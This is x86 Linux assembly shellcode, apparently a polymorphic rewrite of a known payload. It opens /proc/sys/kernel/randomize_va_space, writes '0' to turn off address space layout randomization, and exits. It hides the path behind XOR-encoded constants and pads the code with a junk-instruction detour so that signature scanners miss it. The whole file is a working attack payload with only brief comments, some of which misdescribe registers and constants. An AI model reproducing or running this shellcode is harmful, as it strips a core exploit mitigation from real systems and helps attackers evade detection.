;Shellcode size : 123 bytes (+48%)
global _start

_start:              
    xor ecx, ecx             ;Initialize eax to NULL
    jmp _useless             ;Jump to some useless code, because why not

_goback:
    push ecx                 ;Push NULL on the stack
    push 0x65636170
    push 0x735f6176
    push 0x5f657a69
    mov esi, 0x7C4D572A
    xor esi, 0x11223344
    push esi
    push 0x61722f6c
    push 0x656e7265
    push 0x6b2f7379
    push 0x732f636f
    push 0x72702f2f         ;Push //proc/sys/kernel/randomize_va_space
    mov ebx, esp            ;Initialize ebx to "//proc/sys/kernel/randomize_va_space%00"
    
    mov cx, 0x1ab
    add cx, 0x111           ;Move 0x2bc on the stack which is 700 in decimal 
                            ;700 means the file is opened with READ, WRITE, EXECUTE flags.
    push 10
    pop eax
    dec eax
    dec eax                 ;Initialize al to systemcall number of "open"

    ;Systemcall details:
    ; --> fd = open("//proc/sys/kernel/randomize_va_space%00", S_IRWXU)
    int 0x80                ;Execute systemcall


    mov esi, eax        
    push esi
    pop ebx                 ;Move the return value of "open" which is the file descriptor inside ebx

    push eax                ;Push the file descriptor on the stack
    mov dx, 0x3a30          ;Move 0x3a30 into edx
    push dx                 ;push 0x3a30 on the stack
    mov ecx, esp            ;initialize ecx to stack pointer esp

    push 0x1
    pop edx                 ;Initialize edx to 1
    mov al, 0x4             ;Initialize al to systemcall number of "write"

    ;Systemcall details:
    ; --> write(3, "0", 1)
    int 0x80                ;Execute systemcall

    mov al, 0x3c
    sub al, 0x36            ;Initialize al to systemcall number of "close"
    ;Systemcall details:
    ; --> close(3)
    int 0x80                ;Execute systemcall


    xor eax, eax            ;Initialize al to systemcall number of "exit"
    push eax
    pop ebx                 ;Initiliaze ebx to NULL
    inc eax
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                ;Execute systemcall

_useless:
    mov edi, 0xbadc0ff3     ;initialize edi to 0x1badc0ff3
    nop                     ;a nop instruction
    push edi                ;Push edi on the stack
    mov cl, 10              ;mov 10 inside cl

_return:
    loop _return            ;loop 10 times
    xor ecx, ecx            ;initialize ecx to NULL
    jmp _goback             ;Go back to the real code